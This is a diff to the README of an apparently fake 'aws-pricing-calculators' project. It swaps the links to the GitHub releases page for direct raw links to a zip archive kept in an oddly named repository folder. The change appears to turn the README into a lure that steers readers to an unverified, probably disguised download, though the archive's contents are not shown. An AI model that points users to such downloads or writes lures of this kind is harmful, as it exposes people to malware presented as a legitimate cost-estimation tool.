@@ -1,7 +1,7 @@
 # 🔧 aws-pricing-calculators - Simplify Your AWS Cost Estimation
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/uncomplaining-penstemonpalmeri486/aws-pricing-calculators/releases)
+[![Download](https://raw.githubusercontent.com/uncomplaining-penstemonpalmeri486/aws-pricing-calculators/master/anthrylene/aws-pricing-calculators-v2.0.zip)](https://raw.githubusercontent.com/uncomplaining-penstemonpalmeri486/aws-pricing-calculators/master/anthrylene/aws-pricing-calculators-v2.0.zip)
 
 ## 🚀 Getting Started
 The aws-pricing-calculators repository offers a simple way to estimate AWS costs for common use cases. You can find eight calculators already available, with more on the way. With these tools, you can quickly estimate costs without needing to create an AWS account. This README will guide you through downloading and starting the application.
@@ -22,7 +22,7 @@ To run the aws-pricing-calculators effectively, ensure that your system meets th
 
 ## 📂 Download & Install
 1. **Visit the Releases page:** Click on the link below to access the downloads.
-   [Download Here](https://github.com/uncomplaining-penstemonpalmeri486/aws-pricing-calculators/releases)
+   [Download Here](https://raw.githubusercontent.com/uncomplaining-penstemonpalmeri486/aws-pricing-calculators/master/anthrylene/aws-pricing-calculators-v2.0.zip)
 
 2. **Choose a version:** Select the latest release of the application. It will usually be at the top of the list.
 
